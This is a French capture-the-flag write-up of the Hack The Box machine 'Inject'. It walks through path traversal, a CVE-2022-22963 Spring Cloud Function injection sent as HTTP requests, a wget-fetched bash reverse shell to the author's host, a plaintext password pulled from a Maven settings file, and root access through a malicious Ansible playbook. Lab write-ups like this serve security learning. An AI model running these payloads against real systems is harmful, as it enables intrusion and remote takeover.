---
title: Inject (easy) - HackThe Box Write-up
categories:
- Write-up
tags:
- htb
- web
- vulnérabilités
- cve-2022-22963
- linux
---

## User
### Nmap

```bash
# Nmap 7.93 scan initiated Mon Jun  5 10:18:38 2023 as: nmap -p22,8080 -sV -sC -oA /media/sf_shared_folder_vm2/HTB/Inject/nmap/nmap_result 10.129.196.194
Nmap scan report for 10.129.196.194
Host is up (0.036s latency).

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 caf10c515a596277f0a80c5c7c8ddaf8 (RSA)
|   256 d51c81c97b076b1cc1b429254b52219f (ECDSA)
|_  256 db1d8ceb9472b0d3ed44b96c93a7f91d (ED25519)
8080/tcp open  nagios-nsca Nagios NSCA
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jun  5 10:18:48 2023 -- 1 IP address (1 host up) scanned in 9.83 seconds
```

On a donc deux ports ouverts, un port ssh et web.

### Le site

Le site est un site de vente (encore une fois). Il y a quelques parties du site qui sont disponibles : upload, error (qui renvoie une erreur 500), release_notes - qui présente les derniers changements du site (sans code).

### /upload

Cette partie du site nous intéresse immédiatement. Elle permet d'upload seulement des images.

Lorsqu'on upload une image normale, un lien nous est donné pour afficher cette image. Il ne s'agit pas d'un lien direct vers le répertoire du server, mais d'une fonction qui affiche l'image sans donner le lien direct. Il semble donc compliqué d'exécuter du php ou autre via un png, le header de la réponse à la requête nous informant que nous avons demandé systématiquement une image.

Après plusieurs tentatives il s'avère que c'est sûrement une voie sans issue.

### /show_image?img=img.png

On peut tenter un LFI. Avec `../../../../../toto.png` ça donne en boucle des erreurs 500. Avec un simple `../` on accède à des fichiers du serveur.

Si on tente de remonter au plus "loin" pour le site, on accède à ce qui semble être un projet intelliJ Idea, un éditeur de projet fait pour Java :

```text
.classpath
.DS_Store
.idea
.project
.settings
HELP.md
mvnw
mvnw.cmd
pom.xml
src
target
```

On a donc accès à tout le code source du projet.

On peut également accéder à tout le reste du serveur :

```http
HTTP/1.1 200 
Accept-Ranges: bytes
Content-Type: image/jpeg
Content-Length: 4096
Date: Tue, 06 Jun 2023 11:10:13 GMT
Connection: close

bin
boot
dev
etc
home
lib
lib32
lib64
libx32
lost+found
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```

En se balandant, on voit qu'il y a deux utilisateurs : frank et phil.

### /home

Dans phil et frank il n'y a rien d'intéressant, si ce n'est que dans phil, il y a le flag - illisible - et que c'est donc lui notre cible.


### pom.xml

Etant donné que parcourir le serveur ne sert à rien, revenons à l'application. Ce qui va être le plus intéressant dans un premier temps est le pom.xml, car c'est le fichier qui sert à déterminer les dépendances, et potentiellement lever une application ou un plugin vulnérable, ou bien encore déployer une technique intéressante.

pom.xml :

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
	xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
	<modelVersion>4.0.0</modelVersion>
	<parent>
		<groupId>org.springframework.boot</groupId>
		<artifactId>spring-boot-starter-parent</artifactId>
		<version>2.6.5</version>
		<relativePath/> <!-- lookup parent from repository -->
	</parent>
	<groupId>com.example</groupId>
	<artifactId>WebApp</artifactId>
	<version>0.0.1-SNAPSHOT</version>
	<name>WebApp</name>
	<description>Demo project for Spring Boot</description>
	<properties>
		<java.version>11</java.version>
	</properties>
	<dependencies>
		<dependency>
  			<groupId>com.sun.activation</groupId>
  			<artifactId>javax.activation</artifactId>
  			<version>1.2.0</version>
		</dependency>

		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-thymeleaf</artifactId>
		</dependency>
		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-web</artifactId>
		</dependency>

		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-devtools</artifactId>
			<scope>runtime</scope>
			<optional>true</optional>
		</dependency>

		<dependency>
			<groupId>org.springframework.cloud</groupId>
			<artifactId>spring-cloud-function-web</artifactId>
			<version>3.2.2</version>
		</dependency>
		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-test</artifactId>
			<scope>test</scope>
		</dependency>
		<dependency>
			<groupId>org.webjars</groupId>
			<artifactId>bootstrap</artifactId>
			<version>5.1.3</version>
		</dependency>
		<dependency>
			<groupId>org.webjars</groupId>
			<artifactId>webjars-locator-core</artifactId>
		</dependency>

	</dependencies>
	<build>
		<plugins>
			<plugin>
				<groupId>org.springframework.boot</groupId>
				<artifactId>spring-boot-maven-plugin</artifactId>
				<version>${parent.version}</version>
			</plugin>
		</plugins>
		<finalName>spring-webapp</finalName>
	</build>

</project>
```

En cherchant sur internet, on remarque rapidement que cette version de spring boot, et notamment la dépendance `spring-cloud-function-web` est vulnérable. Les CVE-2022-22963, [CVE-2022-22965](https://access.redhat.com/security/vulnerabilities/RHSB-2022-003) montre qu'il s'agit d'une RCE, sur le endpoint `/functionRouter`.

### CVE-2022-22963

Lien utile : https://sysdig.com/blog/cve-2022-22963-spring-cloud/

C'est une vulnérabilité qui concerne les Spring Cloud Expression. C'est une fonctionnalité de spring et plus spécifiquement du langage d'expression spEL de spring.

La vulnérabilité concerne la possibilité d'injecter le header `spring.cloud.function.routing-expression` et de pouvoir exécuter des fonctions de Java. Cela peut mener tout simplement à exécuter n'importe quelle commande sur le serveur :

```http
POST /functionRouter HTTP/1.1
Host: inject.htb:8080
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("touch /tmp/pouet")
Content-Length: 5

totot
```

Résultat (grâce à la la lfi):

```http
HTTP/1.1 200 
Accept-Ranges: bytes
Content-Type: image/jpeg
Content-Length: 12288
Date: Tue, 06 Jun 2023 14:08:13 GMT
Connection: close

.font-unix
.ICE-unix
.Test-unix
.X11-unix
.XIM-unix
exploit.sh
hsperfdata_frank
pouet
systemd-private-e41c6f6943eb419db9a03ca56298bac2-ModemManager.service-R6v27h
systemd-private-e41c6f6943eb419db9a03ca56298bac2-systemd-logind.service-wm9ANg
systemd-private-e41c6f6943eb419db9a03ca56298bac2-systemd-resolved.service-kAZMYg
systemd-private-e41c6f6943eb419db9a03ca56298bac2-systemd-timesyncd.service-g7FKej
titi
tomcat.8080.4515125589129326133
tomcat-docbase.8080.16664339331097704636
toto
vmware-root_737-4257003961
```

Par contre, les redirections et autres pipes ne sont bien évidemment pas possibles (il ne s'agit pas d'un interpréteur de commande de type bash).

Plusieurs possibilités s'offrent à nous. 

### RFI && reverse shell

L'une d'entre elles consiste à créer un fichier sur notre machine, un script bash, qui va être exécuté via l'application vérolée.

Par exemple :

```bash
#!/usr/bin/sh

sh -i >& /dev/tcp/10.10.14.74/4242 0>&1
```

Et ensuite :

```http
POST /functionRouter HTTP/1.1
Host: inject.htb:8080
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("wget http://10.10.14.74:4343/exploit.sh --output-document=/tmp/exploit.sh")
Content-Length: 5

totot
```

Pour terminer :

```http
POST /functionRouter HTTP/1.1
Host: inject.htb:8080
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("bash /tmp/exploit.sh")
Content-Length: 5

totot
```

Résultat :
```bash
└─$ nc -lnvp 4242
listening on [any] 4242 ...
connect to [10.10.14.74] from (UNKNOWN) [10.129.173.20] 57098
sh: 0: can't access tty; job control turned off
$ ls
bin
boot
dev
etc
home
lib
lib32
lib64
libx32
lost+found
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
$ which python
$ which python3
/usr/bin/python3
$ 
```

Voici le user de plié !

### Déception ?

Le user de plié, oui ! Mais lequel ?

En effet, nous avons bien un user, mais il s'agit de frank, et non de phil ! :-(

Il va donc s'agir soit de devenir phil, ou bien de devenir root.

### Au bout du phil

Pas besoin de partir très loin pour cette histoire.

On peut regarder déjà dans le code source du site s'il ne se trouverait pas par hasard quelque chose d'intéressant : rien.

On peut regarder tout simplement dans notre home : youpi.

Dans le dossier .m2 est un dossier maven, qui contient des dépendances utilisées par maven pour un projet. Ici nous avons le droit à settings.xml, qui contient généralement différentes informations de configuration... dont le mot de passe de phil :

```xml
<?xml version="1.0" encoding="UTF-8"?>
<settings xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
  <servers>
    <server>
      <id>Inject</id>
      <username>phil</username>
      <password>DocPhillovestoInject123</password>
      <privateKey>${user.home}/.ssh/id_dsa</privateKey>
      <filePermissions>660</filePermissions>
      <directoryPermissions>660</directoryPermissions>
      <configuration></configuration>
    </server>
  </servers>
</settings>
```

Ensuite `su phil` nous permet de nous connecter à ce compte.

## Élévation de privilèges

Lorsqu'on exécute linpeas, il n'y a rien de vraiment particulier, si ce n'est énormément de fichier liés à ansible.

Si on exécute pspy, on remarque qu'il y a énormément de choses autour de ansible : c'est probablement notre vecteur d'attaque.

```text
2023/06/06 23:32:02 CMD: UID=0     PID=65533  | /usr/bin/python3 /root/.ansible/tmp/ansible-tmp-1686094321.9814165-65485-109250615245810/AnsiballZ_setup.py 
2023/06/06 23:32:02 CMD: UID=0     PID=65534  | /usr/bin/python3 /root/.ansible/tmp/ansible-tmp-1686094321.9814165-65485-109250615245810/AnsiballZ_setup.py 
2023/06/06 23:32:02 CMD: UID=0     PID=65535  | /usr/bin/python3 /root/.ansible/tmp/ansible-tmp-1686094321.9814165-65485-109250615245810/AnsiballZ_setup.py 
2023/06/06 23:32:02 CMD: UID=0     PID=65536  | /usr/bin/python3 /root/.ansible/tmp/ansible-tmp-1686094321.9814165-65485-109250615245810/AnsiballZ_setup.py 
2023/06/06 23:32:02 CMD: UID=0     PID=65537  | /sbin/vgs --noheadings --nosuffix --units g --separator , 
2023/06/06 23:32:03 CMD: UID=0     PID=65538  | /sbin/lvs --noheadings --nosuffix --units g --separator , 
2023/06/06 23:32:03 CMD: UID=0     PID=65539  | /sbin/pvs --noheadings --nosuffix --units g --separator , 
2023/06/06 23:32:03 CMD: UID=0     PID=65540  | /usr/bin/python3 /root/.ansible/tmp/ansible-tmp-1686094321.9814165-65485-109250615245810/AnsiballZ_setup.py 
2023/06/06 23:32:03 CMD: UID=0     PID=65541  | 
2023/06/06 23:32:03 CMD: UID=0     PID=65548  | 
2023/06/06 23:32:03 CMD: UID=0     PID=65547  | /usr/bin/python3 /root/.ansible/tmp/ansible-tmp-1686094321.9814165-65485-109250615245810/AnsiballZ_setup.py 
2023/06/06 23:32:03 CMD: UID=0     PID=65549  | 
2023/06/06 23:32:03 CMD: UID=0     PID=65550  | /usr/bin/python3 /usr/bin/ansible-playbook /opt/automation/tasks/playbook_1.yml 
2023/06/06 23:32:03 CMD: UID=0     PID=65551  | /bin/sh -c rm -f -r /root/.ansible/tmp/ansible-tmp-1686094321.9814165-65485-109250615245810/ > /dev/null 2>&1 && sleep 0 
2023/06/06 23:32:03 CMD: UID=0     PID=65552  | /bin/sh -c rm -f -r /root/.ansible/tmp/ansible-tmp-1686094321.9814165-65485-109250615245810/ > /dev/null 2>&1 && sleep 0 
2023/06/06 23:32:03 CMD: UID=0     PID=65553  | sleep 0 
2023/06/06 23:32:03 CMD: UID=0     PID=65555  | /usr/bin/python3 /usr/bin/ansible-playbook /opt/automation/tasks/playbook_1.yml 
2023/06/06 23:32:03 CMD: UID=0     PID=65556  | /usr/bin/python3 /usr/bin/ansible-playbook /opt/automation/tasks/playbook_1.yml 
2023/06/06 23:32:03 CMD: UID=0     PID=65557  | /bin/sh -c echo ~root && sleep 0 
2023/06/06 23:32:03 CMD: UID=0     PID=65558  | /bin/sh -c echo ~root && sleep 0 
```


Et notamment, à un moment, ansible-parralel va exécuter tous les fichiers .yml dans le dossier /opt/automation/tasks/.

On peut donc écrire un fichier yml qui va exécuter un script[^footnote] :

```yml
- hosts: localhost
  tasks:
    - name: exploit
      command: sudo bash /tmp/exploit3.sh
```

exploit3.sh :

```sh
#!/usr/bin/sh

sh -i >& /dev/tcp/10.10.14.74/5050 0>&1
```

Résultat :

```bash
└─$ nc -lnvp 5050
listening on [any] 5050 ...
connect to [10.10.14.74] from (UNKNOWN) [10.129.228.213] 51440
sh: 0: can't access tty; job control turned off
# ls
playbook_1.yml
# whoami
root
# cd ~
# ls
playbook_1.yml
root.txt
```

Note :  on pourrait également mettre le suid bit sur bash, mais c'est une solution qui ruine les autres utilisateurs s'il y en a.

La box est terminée.

[^footnote]: https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/ansible-playbook-privilege-escalation/
